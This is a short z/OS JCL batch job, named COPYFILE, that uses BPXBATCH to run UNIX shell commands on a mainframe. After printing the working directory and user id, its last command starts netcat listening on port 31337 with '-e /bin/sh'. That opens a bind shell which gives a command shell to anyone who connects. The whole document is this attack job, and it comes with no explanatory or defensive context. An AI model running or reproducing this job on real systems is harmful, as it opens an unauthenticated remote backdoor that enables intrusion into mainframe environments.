//COPYFILE JOB (INFO),'Execute UNIX',CLASS=A,MSGCLASS=0,
// MSGLEVEL=(1,1),NOTIFY=&USERID
//NETCAT EXEC PGM=BPXBATCH
//STDIN DD SYSOUT=*
//STDOUT DD SYSOUT=*
//STDPARM DD *
SH pwd;
id;
./nc –l –p 31337 –e /bin/sh
/*